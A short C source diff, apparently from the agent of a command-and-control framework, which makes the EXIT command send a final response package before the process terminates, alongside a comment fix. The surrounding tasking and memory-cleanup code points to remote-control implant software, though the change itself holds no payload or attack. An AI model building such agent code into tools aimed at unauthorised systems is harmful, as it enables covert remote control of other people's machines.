@@ -34,9 +34,14 @@ BOOL handleGetTasking(PParser getTasking)
 		}
 		else if (taskCmd == EXIT_CMD)
 		{
+			// Create output package
+			PPackage output = newPackage(0, FALSE);
+			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
+
+			// Send response before exiting
 			PParser responseParser = sendPackage(response);
 
-			// free relevant memory
+			// Free relevant memory
 			LocalFree(taskUuid);
 			freeParser(taskParser);
 			freeParser(getTasking);
@@ -44,6 +49,7 @@ BOOL handleGetTasking(PParser getTasking)
 			freeCeosConfig();
 
 			ExitProcess(0);		// nothing after this line will get executed
+
 			return TRUE;
 		}
 		else
